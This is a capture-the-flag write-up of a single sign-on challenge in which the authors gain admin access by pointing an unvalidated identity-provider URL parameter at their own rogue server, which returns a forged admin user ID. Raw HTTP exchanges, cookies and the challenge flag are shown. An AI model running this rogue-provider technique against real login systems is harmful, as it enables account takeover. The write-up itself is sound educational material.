### Solved by Swappage and rasta_mouse

a nice web challenge involving single signon.

We were provided an unprivileged user:

    username: proff
    password: strobe.c

and we had to login as admin

When we login what happens at first is that a new SSOSESSIONID is assigned to the client:

    POST /users/login HTTP/1.1
    Host: dancing-dingoes.ctfcompetition.com
    User-Agent: Developer_JANEBO
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: https://dancing-dingoes.ctfcompetition.com/?auth=badcookie
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 32

    username=proff&password=strobe.c

    HTTP/1.1 302 Found
    Location: /api/users/login?domain=dancing-dingoes.ctfcompetition.com
    Content-Type: text/html; charset=utf-8
    Date: Sat, 30 Apr 2016 20:50:23 GMT
    Server: Google Frontend
    Content-Length: 0
    Set-Cookie: SSOSESSIONID=dHlwZT1zZXNzaW9uJmlkeD0yJmM9OTImdWlkPTQ3OGN0eD0xNjM4NCZoYXNoPTQ4NDAyYWU2YzYxOTcyZGExYjk4MjUyZDgxNDNiNjYwNjA2ODQ4Yjk5NWEyMWVkZDg2Yjg1MmRkZjJlODI1MDA=; Path=/
    Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
    Connection: close

and then a call to the single sign on API is performed, and in exchange, we receive an APISESSIONID

    GET /api/users/login?domain=dancing-dingoes.ctfcompetition.com HTTP/1.1
    Host: dancing-dingoes.ctfcompetition.com
    User-Agent: Developer_JANEBO
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: https://dancing-dingoes.ctfcompetition.com/?auth=badcookie
    Cookie: SSOSESSIONID=dHlwZT1zZXNzaW9uJmlkeD0yJmM9OTImdWlkPTQ3OGN0eD0xNjM4NCZoYXNoPTQ4NDAyYWU2YzYxOTcyZGExYjk4MjUyZDgxNDNiNjYwNjA2ODQ4Yjk5NWEyMWVkZDg2Yjg1MmRkZjJlODI1MDA=
    Connection: close

    HTTP/1.1 302 Found
    Location: /documents
    Content-Type: text/html; charset=utf-8
    Vary: Accept-Encoding
    Date: Sat, 30 Apr 2016 20:50:23 GMT
    Server: Google Frontend
    Cache-Control: private
    Set-Cookie: APISESSIONID=dHlwZT1wcm9mZiZpZHg9NiZjPTY4JnVpZD05NWN0eD00MTI5Jmhhc2g9NjgxNGVhNzM0YmIzM2YzZmQzZDdmMzJkZjIwZDI1OWZlOTMzNDFmZWY2YmEzNjMyMTkxMGNmODIxNjE3MWIxZg==; Path=/
    Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
    Connection: close
    Content-Length: 33

    <a href="/documents">Found</a>.

if we decode the APISESSIONID cookie we can notice that the username is stored in there, but it's validated with an hash so we cant directly tamper with it

    type=proff&idx=6&c=68&uid=95ctx=4129&hash=6814ea734bb33f3fd3d7f32df20d259fe93341fef6ba36321910cf8216171b1f

if we can modify this cookie we can become admin, but how?

well, the problem is in the implementation of the single signon API on the website, which doesnt correctly validate the endpoint for the accounting of the users.

the get request to the API accepts the URL of the IdP as a get request, what we can do is to modify that parameter to force the application to rely on informations provided by a rogue identity provider.

The application was talking with the IdP using SSL, and required a valid certificate on the end point to work properly, rasta_mouse quickly set up a third level domain and using let's encrypt we created a valid certificate for our rogue Identity provider.

Redirecting the request and logging it using ncat we can see the following request made by the web application:

    GET /rest/v1/user/current HTTP/1.1
    Host: ctf.rastamouse.me
    Cookie: SSOSESSIONID=dHlwZT1zZXNzaW9uJmlkeD04JmM9MTg0JnVpZD05NTljdHg9MjA1MTImaGFzaD01ODdkZDcwNTA5NzQyNzViM2Q4ZGVjZDNmZmRlYzc3MWExYzhhMWQzMWZkMGFjMTQzN2UxZDg0NWVmZDAwNWY4
    X-Cloud-Trace-Context: f4b4533e24851c0e0e518a1201a82426/12550002289912413751;o=1
    Connection: Keep-alive
    User-Agent: AppEngine-Google; (+http://code.google.com/appengine; appid: s~ctf-dancing-dingoes)
    Accept-Encoding: gzip,deflate,br

We then forwarded the request to the legitimate IdP to check what the reply was like.

    > GET /rest/v1/user/current HTTP/1.1
    > Host: dancing-dingoes.ctfcompetition.com
    > User-Agent: curl/7.47.0
    > Accept: */*
    > Cookie: SSOSESSIONID=dHlwZT1zZXNzaW9uJmlkeD04JmM9MTg0JnVpZD05NTljdHg9MjA1MTImaGFzaD01ODdkZDcwNTA5NzQyNzViM2Q4ZGVjZDNmZmRlYzc3MWExYzhhMWQzMWZkMGFjMTQzN2UxZDg0NWVmZDAwNWY4
    >
    * Connection state changed (MAX_CONCURRENT_STREAMS updated)!
    < HTTP/2.0 200
    < content-type:text/html; charset=utf-8
    < vary:Accept-Encoding
    < date:Sat, 30 Apr 2016 22:43:02 GMT
    < server:Google Frontend
    < cache-control:private
    < alt-svc:quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
    < accept-ranges:none
    <
    * Connection #0 to host dancing-dingoes.ctfcompetition.com left intact
    { "UserID": "proff" }

Awesome, we can now set up a working rogue Identity provider on a local webserver to reply with the string

    { "UserID": "admin" }

Hopefully when the API will ask the IdP for the user information, it will accept our response and set up a cookie for the admin user, allowing us to see the flag.

    GET /documents HTTP/1.1
    Host: dancing-dingoes.ctfcompetition.com
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: https://dancing-dingoes.ctfcompetition.com/
    Cookie: SSOSESSIONID=dHlwZT1zZXNzaW9uJmlkeD0zJmM9MjEyJnVpZD03MDNjdHg9Njc3Jmhhc2g9MjQzNWM5Zjg2YjM0NzY4ZmEyNmZhMzdmMWQ5MDhhMDM1MzBmODcyZmExMzE4NjEzYmJiN2IzZWE4YTUxY2VhZA==; APISESSIONID=dHlwZT1hZG1pbiZpZHg9NCZjPTEyNCZ1aWQ9NTExY3R4PTE4NDY5Jmhhc2g9OGJmNzU0MDEwNDBjODBjZmU1ODZhNmMzZGZkYzYyNWU2ZmUxMGE3MGQwYzU0MzNhODM2NzU3MDQ0OThlNzMwZA==
    Connection: close

    HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8
    Vary: Accept-Encoding
    Date: Sun, 01 May 2016 19:21:25 GMT
    Server: Google Frontend
    Cache-Control: private
    Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
    Connection: close
    Content-Length: 1082
```html
    <html>
      <head>
       <meta charset="utf-8">
       <title>outstanding-cobra</title>
       <link rel="stylesheet" href="/static/bootstrap.min.css" media="screen">
      </head>
      <body>
        <div class="container">
          <h1>Documents available</h1>
          <p>Below is the documents available to you!</p>
          <div id="list">
          </div>
        </div>
        <script>
          function displayDocuments(docList) {
            var html = "<ul>";
            for(i = 0; i < docList.length; i++) {
              html += "<li><a href=\"/documents/" + docList[i][0] + "\">" + docList[i][1] + "</a></li>";
            }
            html += "</ul>";
            // console.log(html);
            var o = document.getElementById('list');
            o.innerHTML = html;
          }

          var xh = new XMLHttpRequest();
          var u = "/documents/list";

          xh.onreadystatechange = function() {
            if(xh.readyState == 4 && xh.status == 200) {
              // console.log(xh.responseText);
              displayDocuments(JSON.parse(xh.responseText));
            }
          }

          xh.open("GET", u, true);
          xh.send();
        </script>
      </body>
    </html>
```

    > GET /documents/0b66e3f3-3f8e-4953-9414-00f29da9e68e HTTP/1.1
    > Host: dancing-dingoes.ctfcompetition.com
    > User-Agent: curl/7.47.0
    > Accept: */*
    > Cookie: SSOSESSIONID=dHlwZT1zZXNzaW9uJmlkeD0zJmM9MjEyJnVpZD03MDNjdHg9Njc3Jmhhc2g9MjQzNWM5Zjg2YjM0NzY4ZmEyNmZhMzdmMWQ5MDhhMDM1MzBmODcyZmExMzE4NjEzYmJiN2IzZWE4YTUxY2VhZA==;APISESSIONID=dHlwZT1hZG1pbiZpZHg9NCZjPTEyNCZ1aWQ9NTExY3R4PTE4NDY5Jmhhc2g9OGJmNzU0MDEwNDBjODBjZmU1ODZhNmMzZGZkYzYyNWU2ZmUxMGE3MGQwYzU0MzNhODM2NzU3MDQ0OThlNzMwZA==
    >
    * Connection state changed (MAX_CONCURRENT_STREAMS updated)!
    < HTTP/2.0 200
    < content-type:text/html; charset=utf-8
    < vary:Accept-Encoding
    < date:Sun, 01 May 2016 19:29:17 GMT
    < server:Google Frontend
    < cache-control:private
    < alt-svc:quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
    < accept-ranges:none
    <
    * Connection #0 to host dancing-dingoes.ctfcompetition.com left intact
    Note to self: CTF{lgtm.approval.undo.lgtm.undo.approval}

the flag is CTF{lgtm.approval.undo.lgtm.undo.approval}
